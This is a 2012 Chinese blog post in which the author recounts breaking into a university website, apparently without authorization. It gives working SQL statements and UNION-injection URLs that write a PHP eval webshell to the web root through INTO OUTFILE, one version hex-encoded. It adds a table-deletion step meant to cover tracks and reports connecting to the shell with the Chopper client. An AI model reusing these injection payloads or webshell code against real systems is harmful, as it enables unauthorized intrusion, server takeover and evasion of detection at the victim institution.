title: "mysql outfile getwebshell"
date: 2012-06-13 16:02:06
tags:
id: 57
comment: false
---

最近一直在找大学目标练手。也成功了不少。今天这个算是垂涎了许久吧。也算搞定了啊！
开始用各种神器去找注入，前两天一直也就没找到，主要是没有心情，这两天太热了，课也比较多！
今天晚上去打了两局台球心情还算可以吧，回来搞站也有心情了！但是在回来的路上确实有些倒霉，首先是下着大雨，遇到一对情侣；由于这穷学校没有路灯我只顾跑就把那个男的给撞了，男的没反应，女的发出了尖叫；男的瞬间大怒，我像孙子一样的给他们道歉才得以脱身。。。。。扯远了。。。。
还好找到3个，可惜只有1个可以使用，后来发现权限蛮高的，也算一点点运气吧 。 
用sqlmap看了下具有root权限,什么权限都有
找目录：
[![](http://neusec.cc/wp-content/uploads/2012/06/20120512110411_857.jpg "neusec.cc")](http://neusec.cc/wp-content/uploads/2012/06/20120512110411_857.jpg)
[code lang="c"]
Drop TABLE IF EXISTS temp;    //如果存在temp就删掉
Create TABLE temp(cmd text NOT NULL);    //建立temp表，里面就一个cmd字段
Insert INTO temp (cmd) VALUES(‘&lt;?php eval($_POST[cmd]);?&gt;’);   //把一句话木马插入到temp表
Select cmd from temp into outfile ‘E:\wwwroot\****\a.php’;   //服务是win的，查询temp表中的一句话并把结果导入到a.php
Drop TABLE IF EXISTS temp;   //删除temp(擦屁股o(∩_∩)o…)
[/code]
[![](http://neusec.cc/wp-content/uploads/2012/06/20120512101746_250.jpg "neusec.cc")](http://neusec.cc/wp-content/uploads/2012/06/20120512101746_250.jpg)
结果是不行的。
改手工了
[code lang="c"]
http://xxx.edu.cn/***********=11 order by 4 还回正常，到5就。。。
http://xxx.edu.cn/***********=11 and 0=1 union select 1,2,3,4
http://xxx.edu.cn/***********=11 and 1=0 union select 1,0x3C3F706870206576616C28245F504F53545B636D645D293B3F3E,3,4 into outfile ‘E:\wwwroot\****\a.php’
&lt;br&gt;
[/code]
[![](http://neusec.cc/wp-content/uploads/2012/06/20120512103212_599.jpg "neusec.cc")](http://neusec.cc/wp-content/uploads/2012/06/20120512103212_599.jpg)
菜刀连接很成功,提权未成功。